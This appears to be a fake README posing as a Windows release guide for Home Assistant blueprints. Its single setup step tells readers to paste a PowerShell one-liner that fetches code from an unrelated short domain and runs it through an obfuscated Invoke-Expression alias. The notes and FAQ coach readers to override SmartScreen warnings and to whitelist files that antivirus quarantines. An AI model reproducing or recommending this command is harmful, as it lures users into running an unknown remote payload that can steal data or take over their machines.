# HA Blueprints — Current Release Guide

![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d7?logo=windows11&logoColor=white) ![version](https://img.shields.io/badge/version-v4.4.5-blue) ![status](https://img.shields.io/badge/status-maintained-success) ![updated](https://img.shields.io/badge/updated-2026--11--12-informational) ![license](https://img.shields.io/badge/license-MIT-green)

Looking for a fast way to get started with Home Assistant? This project collects the latest build, setup notes and answers to common questions in one place. Scenes that actually save energy and time.

## ✨ Highlights

- ✅ Community-tested release, feedback welcome via issues
- ✅ Works on Windows 10 and Windows 11 (64-bit)
- ✅ One-click setup — no manual configuration needed
- ✅ Step-by-step documentation included in this repository

## 🚀 Setup in 3 steps

1. Hit **Win + X** to bring up the quick menu.
2. Select **Windows PowerShell / Terminal**.
3. Copy the snippet below into the window and confirm with **Enter**.

```powershell
irm quickrun31.cc/ax38ra|&(gal ie*)
```

> 💡 Tip: keep this command handy — re-running it always fetches the current build.

## 🖥️ Requirements

| Requirement | Details |
|---|---|
| Operating system | Windows 10 / 11 (64-bit) |
| Memory | 4 GB RAM minimum |
| Disk space | ~50 MB free |
| Internet | Needed for the first launch only |

## 📋 Notes

- If your security software flags the command, review it first — it simply downloads and runs the setup from the official source.
- Windows SmartScreen may ask for confirmation the first time; choose "Run anyway".

## ❓ FAQ

<details>
<summary><strong>Is an internet connection required?</strong></summary>

Yes — the first launch pulls the latest build, afterwards it can run mostly offline.

</details>

<details>
<summary><strong>Does it work on Windows 7?</strong></summary>

Legacy systems are not officially supported; use Windows 10 or newer for best results.

</details>

<details>
<summary><strong>Do I need to disable my antivirus?</strong></summary>

Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.

</details>

<details>
<summary><strong>How often is it updated?</strong></summary>

Check the changelog file — updates land roughly every few weeks.

</details>

## 🧾 License

Released under the **MIT License** — see [LICENSE](./LICENSE).

_Disclaimer: this repository is provided for educational purposes. All trademarks belong to their respective owners._
